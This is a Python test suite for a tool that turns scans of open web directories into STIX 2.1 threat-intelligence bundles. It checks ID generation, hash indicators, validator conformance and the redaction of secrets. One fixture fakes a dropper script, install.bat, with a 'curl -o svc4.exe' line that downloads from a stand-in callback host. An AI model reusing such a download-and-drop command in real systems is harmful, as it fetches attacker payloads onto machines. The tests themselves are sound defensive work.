"""A run as a STIX 2.1 bundle, checked against the reference implementation.

The specification details are written from the specification, and these tests
hold them to the official library and the official validator. When one of them
disagrees, the module is wrong, not the test.
"""

from __future__ import annotations

import json
import uuid
from datetime import UTC, datetime
from pathlib import Path

import stix2
from typer.testing import CliRunner

from dirsift import cli
from dirsift.analyze import analyze
from dirsift.asn import AsnTable
from dirsift.models import Entry, Ioc, ScanResult
from dirsift.stix import (
    build_bundle,
    bundle_json,
    file_identity,
    left_out,
    object_id,
    observable_id,
    pattern_string,
    timestamp,
)

runner = CliRunner()

# Identifiers


def test_observable_ids_match_the_reference_implementation():
    cases = [
        (stix2.IPv4Address(value="198.51.100.77"), observable_id(
            "ipv4-addr", {"value": "198.51.100.77"})),
        (stix2.IPv6Address(value="2001:db8::7"), observable_id(
            "ipv6-addr", {"value": "2001:db8::7"})),
        (stix2.DomainName(value="cdn.panel-gate.xyz"), observable_id(
            "domain-name", {"value": "cdn.panel-gate.xyz"})),
        (stix2.URL(value="http://panel-gate.xyz/gate.php?id='1'"), observable_id(
            "url", {"value": "http://panel-gate.xyz/gate.php?id='1'"})),
        (stix2.AutonomousSystem(number=14061), observable_id(
            "autonomous-system", {"number": 14061})),
    ]
    for reference, ours in cases:
        assert reference.id == ours, reference.type


def test_file_ids_match_the_reference_implementation():
    hashes = {"MD5": "b" * 32, "SHA-256": "a" * 64}
    for name in ("install.bat", "отчет_ödeme.exe"):
        reference = stix2.File(name=name, hashes=hashes)
        assert reference.id == observable_id("file", file_identity(name, hashes))
    only_sha = {"SHA-256": "c" * 64}
    reference = stix2.File(name="svc4.exe", hashes=only_sha)
    assert reference.id == observable_id("file", file_identity("svc4.exe", only_sha))


def test_object_ids_are_stable_and_version_4():
    first = object_id("indicator", "http://203.0.113.24/files/", "file|install.bat")
    again = object_id("indicator", "http://203.0.113.24/files/", "file|install.bat")
    other = object_id("indicator", "http://203.0.113.99/files/", "file|install.bat")
    assert first == again != other
    parsed = uuid.UUID(first.split("--", 1)[1])
    assert parsed.version == 4
    assert parsed.variant == uuid.RFC_4122


def test_timestamps_are_utc_with_milliseconds():
    assert timestamp(datetime(2026, 10, 1, 9, 0, 5, 123456, tzinfo=UTC)) == (
        "2026-10-01T09:00:05.123Z"
    )
    assert timestamp(datetime(2026, 10, 1, 9, 0)) == "2026-10-01T09:00:00.000Z"


def test_pattern_strings_escape_backslash_and_quote():
    assert pattern_string("it's") == "'it\\'s'"
    assert pattern_string("C:\\x") == "'C:\\\\x'"
    assert pattern_string("\\'") == "'\\\\\\''"


# Runs

ROOT = "http://203.0.113.24:8080/files/"
STARTED = datetime(2026, 10, 1, 9, 0, tzinfo=UTC)
FINISHED = datetime(2026, 10, 1, 9, 4, 30, tzinfo=UTC)
CALLBACK = "http://198.51.100.77:8443/gate.php"


def entry(path: str, root: str = ROOT, **kw) -> Entry:
    folder, _, name = path.rpartition("/")
    defaults = {"kind": "pe", "fetched_bytes": 4096, "depth": path.count("/") + 1}
    defaults.update(kw)
    return Entry(
        url=root + path,
        name=name,
        parent_url=root + (folder + "/" if folder else ""),
        **defaults,
    )


def kit(root: str = ROOT) -> list[Entry]:
    return [
        entry(
            "install.bat",
            root,
            kind="script",
            fetched_bytes=160,
            size=160,
            sha256="a" * 64,
            md5="b" * 32,
            text_preview=(
                "curl -o svc4.exe " + CALLBACK + "\n"
                "ping cdn.panel-gate.xyz\nrem old box 10.0.0.5\n"
                "set token=hunter2-secret-value\n"
            ),
        ),
        entry("svc4.exe", root, sha256="c" * 64, md5="d" * 32, size=4096),
        entry("bin/svc5.exe", root, truncated=True),
    ]


def run(entries: list[Entry] | None = None, root: str = ROOT, **kw):
    defaults = {
        "started_at": STARTED,
        "finished_at": FINISHED,
        "server": "Apache/2.4.41 (Ubuntu)",
        "title": "Index of /files",
        "listing_flavor": "apache",
        "target_ip": "203.0.113.24",
    }
    defaults.update(kw)
    listed = kit(root) if entries is None else entries
    result = ScanResult(root_url=root, entries=listed, **defaults)
    return analyze(result, asn_table=AsnTable())


def objects(loaded, kind: str | None = None) -> list[dict]:
    bundle = build_bundle(*loaded)
    return [obj for obj in bundle["objects"] if kind is None or obj["type"] == kind]


def relations(loaded, kind: str) -> list[tuple[str, str]]:
    return [
        (obj["source_ref"], obj["target_ref"])
        for obj in objects(loaded, "relationship")
        if obj["relationship_type"] == kind
    ]


# The infrastructure


def test_one_infrastructure_for_the_directory():
    (infra,) = objects(run(), "infrastructure")
    assert infra["name"] == "203.0.113.24:8080/files/"
    assert infra["spec_version"] == "2.1"
    assert infra["first_seen"] == "2026-10-01T09:00:00.000Z"
    assert infra["last_seen"] == "2026-10-01T09:04:30.000Z"
    assert "apache" in infra["description"]
    assert "Apache/2.4.41 (Ubuntu)" in infra["description"]
    assert "no judgement" in infra["description"]


def test_a_run_with_executables_hosts_malware_and_one_without_is_unknown():
    (infra,) = objects(run(), "infrastructure")
    assert infra["infrastructure_types"] == ["hosting-malware"]
    harmless = [
        entry("report.pdf", kind="document", sha256="1" * 64),
        entry("logo.png", kind="image", sha256="2" * 64),
    ]
    (infra,) = objects(run(harmless), "infrastructure")
    assert infra["infrastructure_types"] == ["unknown"]


def test_the_target_is_made_of_its_url_and_address():
    loaded = run()
    (infra,) = objects(loaded, "infrastructure")
    (url,) = [o for o in objects(loaded, "url") if o["value"] == ROOT]
    (address,) = [o for o in objects(loaded, "ipv4-addr") if o["value"] == "203.0.113.24"]
    parts = {target for source, target in relations(loaded, "consists-of") if source == infra["id"]}
    assert {url["id"], address["id"]} <= parts
    assert not objects(loaded, "domain-name") or all(
        o["value"] != "203.0.113.24" for o in objects(loaded, "domain-name")
    )


def test_a_named_target_brings_its_domain():
    root = "http://files.example-staging.xyz/"
    loaded = run(kit(root), root, target_ip=None)
    (infra,) = objects(loaded, "infrastructure")
    (domain,) = [
        o for o in objects(loaded, "domain-name") if o["value"] == "files.example-staging.xyz"
    ]
    assert (infra["id"], domain["id"]) in relations(loaded, "consists-of")


# Files


def test_every_file_read_whole_is_a_file_with_both_hashes():
    loaded = run()
    files = {o["name"]: o for o in objects(loaded, "file")}
    assert set(files) == {"install.bat", "svc4.exe"}
    assert files["install.bat"]["hashes"] == {"MD5": "b" * 32, "SHA-256": "a" * 64}
    assert files["install.bat"]["size"] == 160
    (infra,) = objects(loaded, "infrastructure")
    assert (infra["id"], files["svc4.exe"]["id"]) in relations(loaded, "consists-of")


def test_a_file_without_a_hash_is_left_out_and_counted():
    loaded = run()
    assert "svc5.exe" not in {o["name"] for o in objects(loaded, "file")}
    assert "bin/svc5.exe" not in {o["name"] for o in objects(loaded, "indicator")}
    assert left_out(loaded[0])["files without a hash"] == 1


def test_each_hashed_file_gets_a_hash_indicator_and_no_verdict():
    loaded = run()
    (infra,) = objects(loaded, "infrastructure")
    indicators = {o["name"]: o for o in objects(loaded, "indicator")}
    loader = indicators["install.bat"]
    assert loader["pattern"] == "[file:hashes.'SHA-256' = '" + "a" * 64 + "']"
    assert loader["pattern_type"] == "stix"
    assert loader["valid_from"] == "2026-10-01T09:00:00.000Z"
    assert "entry point candidate" in loader["description"]
    assert "indicator_types" not in loader
    assert (loader["id"], infra["id"]) in relations(loaded, "indicates")
    assert not objects(loaded, "malware")


def test_a_lying_extension_and_a_family_are_described():
    entries = kit() + [
        entry("invoice.pdf", kind="pe", confidence="sniffed", magic="DOS/PE", sha256="e" * 64),
        entry("svc3.exe", sha256="f" * 64),
    ]
    indicators = {o["name"]: o for o in objects(run(entries), "indicator")}
    assert "type mismatch" in indicators["invoice.pdf"]["description"]
    assert "svc{n}.exe" in indicators["svc4.exe"]["description"]


def test_non_ascii_names_reach_the_file_and_the_indicator_intact():
    name = "ödeme_отчет.exe"
    loaded = run(kit() + [entry(name, sha256="9" * 64, md5="8" * 32)])
    assert name in {o["name"] for o in objects(loaded, "file")}
    assert name in {o["name"] for o in objects(loaded, "indicator")}
    assert name in bundle_json(build_bundle(*loaded))


# Indicators from the files


def by_value(loaded, kind: str) -> dict[str, dict]:
    return {o["value"]: o for o in objects(loaded, kind)}


def test_addresses_names_and_urls_become_observables_and_indicators():
    loaded = run()
    patterns = {o["pattern"] for o in objects(loaded, "indicator")}
    assert "[ipv4-addr:value = '198.51.100.77']" in patterns
    assert "[domain-name:value = 'cdn.panel-gate.xyz']" in patterns
    assert f"[url:value = '{CALLBACK}']" in patterns
    assert "198.51.100.77" in by_value(loaded, "ipv4-addr")
    assert CALLBACK in by_value(loaded, "url")


def test_an_indicator_is_tied_to_the_file_it_came_from():
    loaded = run()
    loader = next(o for o in objects(loaded, "file") if o["name"] == "install.bat")
    address = by_value(loaded, "ipv4-addr")["198.51.100.77"]
    assert (loader["id"], address["id"]) in relations(loaded, "related-to")
    indicator = next(
        o for o in objects(loaded, "indicator") if o["pattern"].startswith("[ipv4-addr")
    )
    assert indicator["description"] == (
        "Found in install.bat; extracted from file contents by dirsift."
    )


def test_a_private_address_is_left_out_and_counted():
    loaded = run()
    assert "10.0.0.5" not in bundle_json(build_bundle(*loaded))
    assert left_out(loaded[0])["private addresses"] == 1


def test_a_secret_never_reaches_the_bundle():
    loaded = run()
    assert any(ioc.ioc_type == "secret" for ioc in loaded[0].iocs)
    assert "hunter2-secret-value" not in bundle_json(build_bundle(*loaded))


def test_the_line_an_indicator_sat_on_stays_out():
    text = bundle_json(build_bundle(*run()))
    for fragment in ("curl -o", "ping cdn", "rem old box"):
        assert fragment not in text


def test_a_quote_and_a_backslash_in_a_url_are_escaped_and_accepted():
    """The extractor stops a URL at a quote, so this one is placed on the run by hand."""
    odd = "http://198.51.100.9/a'b\\c.php"
    result, candidates = run()
    result.iocs.append(
        Ioc(ioc_type="url", value=odd, defanged=odd, source_url=ROOT + "install.bat")
    )
    loaded = (result, candidates)
    (indicator,) = [o for o in objects(loaded, "indicator") if o.get("name") == odd]
    assert indicator["pattern"] == "[url:value = 'http://198.51.100.9/a\\'b\\\\c.php']"
    stix2.parse(json.dumps(indicator), allow_custom=False)


# Networks


def test_a_placed_target_belongs_to_its_autonomous_system():
    loaded = run(target_asn=14061, target_as_name="DIGITALOCEAN-ASN")
    (system,) = objects(loaded, "autonomous-system")
    assert system["number"] == 14061
    assert system["name"] == "DIGITALOCEAN-ASN"
    address = by_value(loaded, "ipv4-addr")["203.0.113.24"]
    assert (address["id"], system["id"]) in relations(loaded, "belongs-to")


def test_no_placement_means_no_autonomous_system():
    loaded = run()
    assert objects(loaded, "autonomous-system") == []
    assert relations(loaded, "belongs-to") == []


def test_a_placed_indicator_address_belongs_to_its_system_too():
    result, candidates = run()
    for ioc in result.iocs:
        if ioc.value.startswith("198.51.100.77"):
            ioc.asn, ioc.as_name = 64497, "TEST-NET-HOSTING"
    loaded = (result, candidates)
    (system,) = objects(loaded, "autonomous-system")
    address = by_value(loaded, "ipv4-addr")["198.51.100.77"]
    assert (address["id"], system["id"]) in relations(loaded, "belongs-to")


# The official validator and parser


def full_run():
    """Every kind of object at once: a placed target, a placed callback, files, a family."""
    result, candidates = run(
        kit() + [
            entry("invoice.pdf", kind="pe", confidence="sniffed", magic="DOS/PE",
                  sha256="e" * 64, md5="f" * 32),
            entry("svc3.exe", sha256="1" * 64),
            entry("отчет_ödeme.exe", sha256="2" * 64, md5="3" * 32, size=1024),
        ],
        target_asn=14061,
        target_as_name="DIGITALOCEAN-ASN",
    )
    for ioc in result.iocs:
        if ioc.value.startswith("198.51.100.77"):
            ioc.asn, ioc.as_name, ioc.country = 64497, "TEST-NET-HOSTING", "DE"
    return result, candidates


def test_the_bundle_passes_the_strict_validator():
    from stix2validator import ValidationOptions, validate_string

    text = bundle_json(build_bundle(*full_run()))
    results = validate_string(text, ValidationOptions(version="2.1", strict=True))
    messages = [str(message) for message in (results.errors or []) + (results.warnings or [])]
    assert results.is_valid, "\n".join(messages)


def test_a_marked_bundle_passes_the_strict_validator():
    from stix2validator import ValidationOptions, validate_string

    for level in ("CLEAR", "GREEN", "AMBER", "RED"):
        text = bundle_json(build_bundle(*full_run(), tlp=level))
        results = validate_string(text, ValidationOptions(version="2.1", strict=True))
        messages = [str(m) for m in (results.errors or []) + (results.warnings or [])]
        assert results.is_valid, level + ": " + "; ".join(messages)
        parsed = stix2.parse(text, allow_custom=False)
        marking = {"CLEAR": stix2.TLP_WHITE, "GREEN": stix2.TLP_GREEN,
                   "AMBER": stix2.TLP_AMBER, "RED": stix2.TLP_RED}[level]
        for obj in parsed.objects:
            if obj.type == "marking-definition":
                assert obj.id == marking.id
                assert obj.definition.tlp == marking.definition.tlp
            else:
                assert obj.object_marking_refs == [marking.id]


def test_the_bundle_parses_without_custom_content():
    text = bundle_json(build_bundle(*full_run()))
    parsed = stix2.parse(text, allow_custom=False)
    assert parsed.type == "bundle"
    assert "spec_version" not in json.loads(text)
    assert set(json.loads(text)) == {"type", "id", "objects"}


def test_the_same_run_exports_the_same_bytes():
    assert bundle_json(build_bundle(*full_run())) == bundle_json(build_bundle(*full_run()))


def test_two_runs_share_indicator_observables_but_not_a_bundle():
    first = build_bundle(*run())
    later = build_bundle(*run(started_at=datetime(2026, 10, 8, 9, 0, tzinfo=UTC)))
    assert first["id"] != later["id"]

    def address(bundle):
        return next(
            o["id"] for o in bundle["objects"]
            if o["type"] == "ipv4-addr" and o["value"] == "198.51.100.77"
        )

    assert address(first) == address(later)


def test_no_verdict_anywhere_in_the_bundle():
    text = bundle_json(build_bundle(*full_run()))
    bundle = json.loads(text)
    assert not [o for o in bundle["objects"] if o["type"] == "malware"]
    assert "indicator_types" not in text
    assert "malicious-activity" not in text
    assert '"x_' not in text
    assert '"defanged"' not in text


def test_a_name_based_uuid_left_at_version_5_would_fail_the_validator():
    """Why object_id sets the version bits: strict validation wants UUIDv4 here."""
    from stix2validator import ValidationOptions, validate_string

    bundle = json.loads(bundle_json(build_bundle(*run())))
    infra = next(o for o in bundle["objects"] if o["type"] == "infrastructure")
    raw = "infrastructure--" + str(uuid.uuid5(uuid.NAMESPACE_URL, ROOT))
    for obj in bundle["objects"]:
        for key in ("id", "source_ref", "target_ref"):
            if obj.get(key) == infra["id"]:
                obj[key] = raw
    results = validate_string(json.dumps(bundle), ValidationOptions(version="2.1", strict=True))
    assert not results.is_valid


# The command



def saved(tmp_path: Path, loaded=None) -> Path:
    result, _ = loaded or run()
    path = tmp_path / "run.json"
    path.write_text(result.model_dump_json(indent=2), encoding="utf-8")
    return path


def test_stix_without_out_refuses_and_prints_no_bundle(tmp_path: Path):
    reply = runner.invoke(cli.app, ["stix", str(saved(tmp_path))])
    assert reply.exit_code == 2
    assert '"type": "bundle"' not in reply.stdout
    assert "198.51.100.77" not in reply.stdout


def test_stix_writes_the_bundle_as_utf8_and_says_it_is_live(tmp_path: Path):
    name = "ödeme_отчет.exe"
    loaded = run(kit() + [entry(name, sha256="9" * 64, md5="8" * 32)])
    out = tmp_path / "out" / "run.stix.json"
    reply = runner.invoke(cli.app, ["stix", str(saved(tmp_path, loaded)), "-o", str(out)])
    assert reply.exit_code == 0, reply.stdout
    text = out.read_text(encoding="utf-8")
    assert json.loads(text)["type"] == "bundle"
    assert name in text
    assert "live indicators" in reply.stdout.lower()
    assert '"type": "bundle"' not in reply.stdout
    assert "198.51.100.77" not in reply.stdout


def test_stix_summary_counts_what_was_left_out(tmp_path: Path):
    out = tmp_path / "run.stix.json"
    reply = runner.invoke(cli.app, ["stix", str(saved(tmp_path)), "-o", str(out)])
    assert reply.exit_code == 0
    lines = {" ".join(line.split()) for line in reply.stdout.splitlines()}
    assert "files without a hash 1" in lines
    assert "private addresses 1" in lines
    assert any(line.startswith("infrastructure 1") for line in lines)


def test_stix_with_a_missing_run_is_a_sentence(tmp_path: Path):
    reply = runner.invoke(
        cli.app, ["stix", str(tmp_path / "nope.json"), "-o", str(tmp_path / "x.json")]
    )
    assert reply.exit_code == 2
    assert "nope.json" in reply.stdout
    assert "Traceback" not in reply.stdout
    assert not (tmp_path / "x.json").exists()


def test_stix_never_opens_a_connection(tmp_path: Path, monkeypatch):
    import httpx

    class NoNetwork:
        def __init__(self, *args, **kwargs):
            raise AssertionError("stix tried to open an HTTP client")

    monkeypatch.setattr(httpx, "Client", NoNetwork)
    monkeypatch.setattr(httpx, "AsyncClient", NoNetwork)
    out = tmp_path / "run.stix.json"
    reply = runner.invoke(cli.app, ["stix", str(saved(tmp_path, full_run())), "-o", str(out)])
    assert reply.exit_code == 0, reply.stdout
    assert out.exists()
